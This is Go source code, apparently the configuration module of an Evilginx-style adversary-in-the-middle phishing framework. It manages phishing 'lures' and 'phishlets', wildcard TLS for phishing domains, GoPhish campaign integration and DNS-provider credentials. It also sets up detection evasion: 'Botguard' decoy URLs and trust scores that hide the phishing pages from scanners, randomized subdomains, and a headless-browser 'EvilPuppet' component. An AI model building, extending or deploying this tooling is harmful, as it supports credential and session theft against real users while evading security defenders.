func (c *Config) DeleteLures(index []int) []int {
	tlures := []*Lure{}
	tlureIds := []string{}
	di := []int{}
	for n, l := range c.lures {
		if !intExists(n, index) {
			tlures = append(tlures, l)
			tlureIds = append(tlureIds, c.lureIds[n])
		} else {
			di = append(di, n)
		}
	}
	if len(di) > 0 {
		c.lures = tlures
		c.lureIds = tlureIds
		c.cfg.Set(CFG_LURES, c.lures)
		c.cfg.WriteConfig()
	}
	return di
}

func (c *Config) GetLure(index int) (*Lure, error) {
	if index >= 0 && index < len(c.lures) {
		return c.lures[index], nil
	} else {
		return nil, fmt.Errorf("index out of bounds: %d", index)
	}
}

// SetLureDomain sets a domain override for a lure (multi-domain support)
func (c *Config) SetLureDomain(index int, domain string) error {
	if index < 0 || index >= len(c.lures) {
		return fmt.Errorf("index out of bounds: %d", index)
	}

	// Validate domain is registered (if not empty)
	if domain != "" {
		validDomain := false
		if domain == c.general.Domain {
			validDomain = true
		} else {
			for _, d := range c.externalDomains {
				if d.Domain == domain {
					validDomain = true
					break
				}
			}
		}
		if !validDomain {
			return fmt.Errorf("domain '%s' is not registered", domain)
		}
	}

	c.lures[index].Domain = domain
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	if domain != "" {
		log.Info("lure %d domain set to: %s", index, domain)
	} else {
		log.Info("lure %d domain cleared (will use phishlet domain)", index)
	}
	return nil
}

// GetLureDomain returns the effective domain for a lure (lure override > phishlet domain > base domain)
func (c *Config) GetLureDomain(index int) (string, error) {
	if index < 0 || index >= len(c.lures) {
		return "", fmt.Errorf("index out of bounds: %d", index)
	}
	l := c.lures[index]

	// 1. Lure-specific domain override
	if l.Domain != "" {
		return l.Domain, nil
	}

	// 2. Phishlet's assigned domain
	plDomain := c.GetSiteAssignedDomain(l.Phishlet)
	if plDomain != "" {
		return plDomain, nil
	}

	// 3. Base domain fallback
	return c.general.Domain, nil
}

func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
	for _, l := range c.lures {
		if l.Phishlet == site && l.Path == path {
			// Check custom lure hostname
			if host == l.Hostname {
				return l, nil
			}
			// Check against ALL proxy hosts of the phishlet (not just the first landing host)
			// This fixes a bug where phishlets with multiple is_landing proxy hosts would only
			// match the first one, causing lure URLs generated from a different landing host
			// to be rejected as "unauthorized request"
			pl, err := c.GetPhishlet(site)
			if err == nil {
				phishDomain, ok := c.GetSiteDomain(pl.Name)
				if ok {
					for _, ph := range pl.proxyHosts {
						if host == combineHost(ph.phish_subdomain, phishDomain) {
							return l, nil
						}
					}
				}
			}
		}
	}
	return nil, fmt.Errorf("lure for path '%s' not found", path)
}

func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
	pl, ok := c.phishlets[site]
	if !ok {
		return nil, fmt.Errorf("phishlet '%s' not found", site)
	}
	return pl, nil
}

// GetPhishletHosts returns all hostnames (phishing subdomains) for a phishlet
func (c *Config) GetPhishletHosts(site string, baseHostname string) []string {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		return []string{baseHostname}
	}

	hosts := []string{}
	proxyHosts := pl.GetProxyHosts()

	for _, ph := range proxyHosts {
		var hostname string
		if ph.PhishSub == "" {
			hostname = baseHostname
		} else {
			hostname = ph.PhishSub + "." + baseHostname
		}
		// Avoid duplicates
		exists := false
		for _, h := range hosts {
			if h == hostname {
				exists = true
				break
			}
		}
		if !exists {
			hosts = append(hosts, hostname)
		}
	}

	// Always include the base hostname
	baseExists := false
	for _, h := range hosts {
		if h == baseHostname {
			baseExists = true
			break
		}
	}
	if !baseExists {
		hosts = append([]string{baseHostname}, hosts...)
	}

	return hosts
}

func (c *Config) GetPhishletNames() []string {
	return c.phishletNames
}

func (c *Config) GetSiteDomain(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.Hostname, ok
	}
	return "", false
}

func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.UnauthUrl, ok
	}
	return "", false
}

func (c *Config) GetBaseDomain() string {
	return c.general.Domain
}

func (c *Config) GetServerExternalIP() string {
	return c.general.ExternalIpv4
}

func (c *Config) GetServerBindIP() string {
	return c.general.BindIpv4
}

func (c *Config) SetRedirectUrl(url string) {
	c.redirectUrl = url
	log.Info("redirect URL set to: %s", url)
}

func (c *Config) GetRedirectUrl() string {
	return c.redirectUrl
}

func (c *Config) SetSpoofUrl(url string) {
	c.spoofUrl = url
	log.Info("spoof URL set to: %s", url)
}

func (c *Config) GetSpoofUrl() string {
	return c.spoofUrl
}

func (c *Config) GetHttpsPort() int {
	return c.general.HttpsPort
}

func (c *Config) GetDnsPort() int {
	return c.general.DnsPort
}

func (c *Config) GetRedirectorsDir() string {
	return c.redirectorsDir
}

func (c *Config) GetDataDir() string {
	return c.dataDir
}

func (c *Config) GetBlacklistMode() string {
	return c.blacklistConfig.Mode
}

func (c *Config) IsAutocertEnabled() bool {
	return c.general.Autocert
}

func (c *Config) EnableWildcardTLS(enabled bool) {
	c.general.WildcardTLS = enabled
	if enabled {
		log.Info("wildcard TLS certificates are now enabled")
	} else {
		log.Info("wildcard TLS certificates are now disabled")
	}
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) IsWildcardTLSEnabled() bool {
	return c.general.WildcardTLS
}

// EnableRandomizeSubdomains toggles automatic subdomain randomization for phishlets.
// When enabled, phish_sub values defined in YAML are replaced with random 4-6 char
// alphanumeric strings that are persisted in config so they survive restarts.
func (c *Config) EnableRandomizeSubdomains(enabled bool) {
	c.general.RandomizeSubdomains = enabled
	if enabled {
		log.Info("subdomain randomization is now enabled - phishlets will use random subdomains")
		log.Info("note: re-load phishlets to apply (restart or re-enable phishlets)")
	} else {
		log.Info("subdomain randomization is now disabled - phishlets will use YAML-defined subdomains")
	}
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) IsRandomizeSubdomainsEnabled() bool {
	return c.general.RandomizeSubdomains
}

// GetOrCreateRandomSub returns a randomized phish_sub for a given phishlet + original key.
// If one was already generated and stored, it is returned. Otherwise a new random
// 4-6 char alphanumeric string is generated, stored, and persisted.
func (c *Config) GetOrCreateRandomSub(site string, origKey string) string {
	pc := c.PhishletConfig(site)
	if pc.SubdomainMap == nil {
		pc.SubdomainMap = make(map[string]string)
	}
	if existing, ok := pc.SubdomainMap[origKey]; ok && existing != "" {
		return existing
	}
	// Generate random 4-6 char lowercase alphanumeric subdomain
	randomSub := genRandomSubdomain()
	pc.SubdomainMap[origKey] = randomSub
	c.SavePhishlets()
	return randomSub
}

// ClearSubdomainMap removes all stored random subdomain mappings for a phishlet,
// causing new random subdomains to be generated on next load.
func (c *Config) ClearSubdomainMap(site string) {
	pc := c.PhishletConfig(site)
	pc.SubdomainMap = make(map[string]string)
	c.SavePhishlets()
}

// GetWildcardDomains returns a list of unique domains that need wildcard certificates
// Returns domains in the format *.domain.com for wildcard certificate requests
func (c *Config) GetWildcardDomains() []string {
	domainSet := make(map[string]bool)
	var wildcardDomains []string

	// Get base domain
	baseDomain := c.GetBaseDomain()
	if baseDomain != "" {
		domainSet[baseDomain] = true
	}

	// Get all external domains
	for _, dom := range c.externalDomains {
		if dom.Domain != "" {
			domainSet[dom.Domain] = true
		}
	}

	// Get domains from phishlet assignments
	for _, pc := range c.phishletConfig {
		if pc.Domain != "" {
			domainSet[pc.Domain] = true
		}
	}

	// Convert to wildcard format
	for domain := range domainSet {
		// Add both wildcard and apex domain (Let's Encrypt requires both for wildcard)
		wildcardDomains = append(wildcardDomains, "*."+domain)
		wildcardDomains = append(wildcardDomains, domain)
	}

	return wildcardDomains
}

func (c *Config) GetGoPhishAdminUrl() string {
	return c.gophishConfig.AdminUrl
}

func (c *Config) GetGoPhishApiKey() string {
	return c.gophishConfig.ApiKey
}

func (c *Config) GetGoPhishInsecureTLS() bool {
	return c.gophishConfig.InsecureTLS
}

// Botguard configuration methods
func (c *Config) SaveBotguardConfig() {
	c.cfg.Set(CFG_BOTGUARD, c.botguardConfig)
	c.cfg.WriteConfig()
}

func (c *Config) IsBotguardEnabled() bool {
	return c.botguardConfig.Enabled
}

func (c *Config) EnableBotguard(enabled bool) {
	c.botguardConfig.Enabled = enabled
	c.cfg.Set(CFG_BOTGUARD+".enabled", enabled)
	c.cfg.WriteConfig()
	if enabled {
		log.Info("Botguard enabled")
	} else {
		log.Info("Botguard disabled")
	}
}

func (c *Config) GetBotguardSpoofUrls() []string {
	return c.botguardConfig.SpoofUrls
}

func (c *Config) AddBotguardSpoofUrl(url string) {
	// Check if URL already exists
	for _, u := range c.botguardConfig.SpoofUrls {
		if u == url {
			log.Warning("Spoof URL already exists: %s", url)
			return
		}
	}
	c.botguardConfig.SpoofUrls = append(c.botguardConfig.SpoofUrls, url)
	c.cfg.Set(CFG_BOTGUARD+".spoof_urls", c.botguardConfig.SpoofUrls)
	c.cfg.WriteConfig()
	log.Info("Added spoof URL: %s", url)
}

func (c *Config) RemoveBotguardSpoofUrl(url string) bool {
	for i, u := range c.botguardConfig.SpoofUrls {
		if u == url {
			c.botguardConfig.SpoofUrls = append(c.botguardConfig.SpoofUrls[:i], c.botguardConfig.SpoofUrls[i+1:]...)
			c.cfg.Set(CFG_BOTGUARD+".spoof_urls", c.botguardConfig.SpoofUrls)
			c.cfg.WriteConfig()
			log.Info("Removed spoof URL: %s", url)
			return true
		}
	}
	return false
}

func (c *Config) ClearBotguardSpoofUrls() {
	c.botguardConfig.SpoofUrls = []string{}
	c.cfg.Set(CFG_BOTGUARD+".spoof_urls", c.botguardConfig.SpoofUrls)
	c.cfg.WriteConfig()
	log.Info("Cleared all spoof URLs")
}

func (c *Config) GetBotguardMinTrustScore() int {
	return c.botguardConfig.MinTrustScore
}

func (c *Config) SetBotguardMinTrustScore(score int) {
	if score < 0 {
		score = 0
	}
	if score > 100 {
		score = 100
	}
	c.botguardConfig.MinTrustScore = score
	c.cfg.Set(CFG_BOTGUARD+".min_trust_score", score)
	c.cfg.WriteConfig()
	log.Info("Botguard minimum trust score set to: %d", score)
}

func (c *Config) GetBotguardConfig() *BotguardCfg {
	return c.botguardConfig
}

// ============================================================================
// EvilPuppet configuration methods
// ============================================================================

func (c *Config) SaveEvilPuppetConfig() {
	c.cfg.Set(CFG_EVILPUPPET, c.evilpuppetConfig)
	c.cfg.WriteConfig()
}

func (c *Config) IsEvilPuppetEnabled() bool {
	return c.evilpuppetConfig.Enabled
}

func (c *Config) EnableEvilPuppet(enabled bool) {
	c.evilpuppetConfig.Enabled = enabled
	c.cfg.Set(CFG_EVILPUPPET+".enabled", enabled)
	c.cfg.WriteConfig()
	if enabled {
		log.Info("EvilPuppet enabled")
	} else {
		log.Info("EvilPuppet disabled")
	}
}

func (c *Config) GetEvilPuppetChromiumPath() string {
	return c.evilpuppetConfig.ChromiumPath
}

func (c *Config) SetEvilPuppetChromiumPath(path string) {
	c.evilpuppetConfig.ChromiumPath = path
	c.cfg.Set(CFG_EVILPUPPET+".chromium_path", path)
	c.cfg.WriteConfig()
	log.Info("EvilPuppet chromium path set to: %s", path)
}

func (c *Config) GetEvilPuppetDisplay() string {
	return c.evilpuppetConfig.Display
}

func (c *Config) SetEvilPuppetDisplay(display string) {
	c.evilpuppetConfig.Display = display
	c.cfg.Set(CFG_EVILPUPPET+".display", display)
	c.cfg.WriteConfig()
	log.Info("EvilPuppet display set to: %s", display)
}

func (c *Config) GetEvilPuppetTimeout() int {
	if c.evilpuppetConfig.Timeout <= 0 {
		return 30
	}
	return c.evilpuppetConfig.Timeout
}

func (c *Config) SetEvilPuppetTimeout(timeout int) {
	if timeout < 5 {
		timeout = 5
	}
	if timeout > 300 {
		timeout = 300
	}
	c.evilpuppetConfig.Timeout = timeout
	c.cfg.Set(CFG_EVILPUPPET+".timeout", timeout)
	c.cfg.WriteConfig()
	log.Info("EvilPuppet timeout set to: %d seconds", timeout)
}

func (c *Config) IsEvilPuppetDebug() bool {
	return c.evilpuppetConfig.Debug
}

func (c *Config) SetEvilPuppetDebug(debug bool) {
	c.evilpuppetConfig.Debug = debug
	c.cfg.Set(CFG_EVILPUPPET+".debug", debug)
	c.cfg.WriteConfig()
	if debug {
		log.Info("EvilPuppet debug mode enabled")
	} else {
		log.Info("EvilPuppet debug mode disabled")
	}
}

func (c *Config) GetEvilPuppetConfig() *EvilPuppetCfg {
	return c.evilpuppetConfig
}

// ============================================================================
// External DNS Domain Management
// ============================================================================

func (c *Config) SaveDomainsConfig() {
	c.cfg.Set(CFG_DOMAINS, c.externalDomains)
	c.cfg.WriteConfig()
}

func (c *Config) GetExternalDomains() []*ExternalDNSDomainCfg {
	return c.externalDomains
}

func (c *Config) AddExternalDomain(domain, provider string, credentials map[string]string) error {
	// Check if domain already exists
	for _, d := range c.externalDomains {
		if d.Domain == domain {
			return fmt.Errorf("domain %s already exists", domain)
		}
	}

	domCfg := &ExternalDNSDomainCfg{
		Domain:      domain,
		Provider:    provider,
		Credentials: credentials,
	}
	c.externalDomains = append(c.externalDomains, domCfg)

	// Register with ExternalDNS manager
	GetExternalDNS().AddDomain(&DomainDNSConfig{
		Domain:      domain,
		Provider:    provider,
		Credentials: credentials,
	})

	c.SaveDomainsConfig()
	log.Info("Added domain: %s (provider: %s)", domain, provider)
	return nil
}

func (c *Config) RemoveExternalDomain(domain string) error {
	for i, d := range c.externalDomains {
		if d.Domain == domain {
			c.externalDomains = append(c.externalDomains[:i], c.externalDomains[i+1:]...)
			GetExternalDNS().RemoveDomain(domain)
			c.SaveDomainsConfig()
			log.Info("Removed domain: %s", domain)
			return nil
		}
	}
	return fmt.Errorf("domain %s not found", domain)
}

func (c *Config) GetExternalDomain(domain string) *ExternalDNSDomainCfg {
	for _, d := range c.externalDomains {
		if d.Domain == domain {
			return d
		}
	}
	return nil
}

func (c *Config) SetExternalDomainProvider(domain, provider string, credentials map[string]string) error {
	for _, d := range c.externalDomains {
		if d.Domain == domain {
			d.Provider = provider
			if credentials != nil {
				if d.Credentials == nil {
					d.Credentials = make(map[string]string)
				}
				for k, v := range credentials {
					d.Credentials[k] = v
				}
			}

			// Update ExternalDNS manager
			GetExternalDNS().AddDomain(&DomainDNSConfig{
				Domain:      domain,
				Provider:    provider,
				Credentials: d.Credentials,
			})

			c.SaveDomainsConfig()
			log.Info("Updated domain %s: provider set to %s", domain, provider)
			return nil
		}
	}
	return fmt.Errorf("domain %s not found", domain)
}

// GetDomainForHostname finds the matching domain configuration for a hostname
func (c *Config) GetDomainForHostname(hostname string) *ExternalDNSDomainCfg {
	for _, d := range c.externalDomains {
		if hostname == d.Domain || strings.HasSuffix(hostname, "."+d.Domain) {
			return d
		}
	}
	return nil
}

// IsExternalDNS returns true if the domain uses external DNS (not internal)
func (c *Config) IsExternalDNS(domain string) bool {
	d := c.GetExternalDomain(domain)
	if d == nil {
		return false
	}
	return d.Provider != "" && d.Provider != "internal"
}

// ============================================================================
// Notifier Configuration Methods
// ============================================================================

// generateServerName generates a random server name
func generateServerName() string {
	words := []string{"alpha", "beta", "gamma", "delta", "echo", "foxtrot", "golf", "hotel",
		"india", "juliet", "kilo", "lima", "mike", "november", "oscar", "papa",
		"quebec", "romeo", "sierra", "tango", "uniform", "victor", "whiskey", "xray",
		"yankee", "zulu", "phoenix", "dragon", "tiger", "falcon", "eagle", "hawk",
		"wolf", "bear", "lion", "shark", "cobra", "viper", "shadow", "storm"}

	word := words[int(time.Now().UnixNano())%len(words)]
	num := int(time.Now().UnixNano() % 1000)
	return fmt.Sprintf("%s%d", word, num)
}

func (c *Config) GetServerName() string {
	return c.serverName
}

func (c *Config) SetServerName(name string) {
	c.serverName = name
	c.cfg.Set(CFG_SERVER_NAME, name)
	c.cfg.WriteConfig()
	log.Info("server name set to: %s", name)
}

func (c *Config) SaveNotifiersConfig() {
	c.cfg.Set(CFG_NOTIFIERS, c.notifiers)
	c.cfg.Set(CFG_NOTIFY_DEFAULTS, c.notifierDefaults)
	c.cfg.WriteConfig()
}

func (c *Config) GetNotifiers() []*NotifierConfig {
	return c.notifiers
}

func (c *Config) GetNotifierDefaults() *DefaultNotifierConfig {
	return c.notifierDefaults
}

func (c *Config) SetNotifierDefaults(defaults *DefaultNotifierConfig) {
	c.notifierDefaults = defaults
}

func (c *Config) GetNotifier(name string) *NotifierConfig {
	for _, n := range c.notifiers {
		if n.Name == name {
			return n
		}
	}
	return nil
}

func (c *Config) AddNotifier(notifier *NotifierConfig) error {
	// Check if notifier already exists
	for _, n := range c.notifiers {
		if n.Name == notifier.Name {
			return fmt.Errorf("notifier '%s' already exists", notifier.Name)
		}
	}
	c.notifiers = append(c.notifiers, notifier)
	c.SaveNotifiersConfig()
	return nil
}

func (c *Config) UpdateNotifier(notifier *NotifierConfig) error {
	for i, n := range c.notifiers {
		if n.Name == notifier.Name {
			c.notifiers[i] = notifier
			c.SaveNotifiersConfig()
			return nil
		}
	}
	return fmt.Errorf("notifier '%s' not found", notifier.Name)
}

func (c *Config) DeleteNotifier(name string) error {
	for i, n := range c.notifiers {
		if n.Name == name {
			c.notifiers = append(c.notifiers[:i], c.notifiers[i+1:]...)
			c.SaveNotifiersConfig()
			return nil
		}
	}
	return fmt.Errorf("notifier '%s' not found", name)
}

// ============================================================================
// JA4 config methods
// ============================================================================
func (c *Config) IsJA4Enabled() bool {
	return c.botguardConfig.Enabled
}

func (c *Config) SetJA4Enabled(enabled bool) {
	c.botguardConfig.Enabled = enabled
}

func (c *Config) IsJA4AutoBlockEnabled() bool {
	return false
}

func (c *Config) SetJA4AutoBlock(enabled bool) {}
